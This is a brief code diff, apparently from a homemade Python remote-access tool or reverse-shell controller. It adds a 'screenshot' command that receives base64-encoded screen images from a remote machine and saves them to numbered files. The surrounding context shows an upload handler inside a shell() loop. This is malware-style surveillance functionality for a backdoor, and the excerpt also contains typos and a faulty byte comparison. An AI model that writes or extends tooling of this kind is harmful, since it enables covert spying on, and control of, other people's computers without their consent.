@@ -40,6 +40,15 @@ def shell():
 			except:
 				failed = "failed to upload "
 				relibale_send(base64.b64encode(failed))
+		elif command[:10] == "screenshot":
+			with open("screenhot%d" % count, "wb") as screen:
+				image = reliable_recv()
+				image_decoded = base64.b64decode(image)
+				if image_decoded[:4] == ["[!!]"]:
+					print(image_decoded)
+				else:
+					screen.write(image_decoded)
+					count += 1
 
 			
 		else:
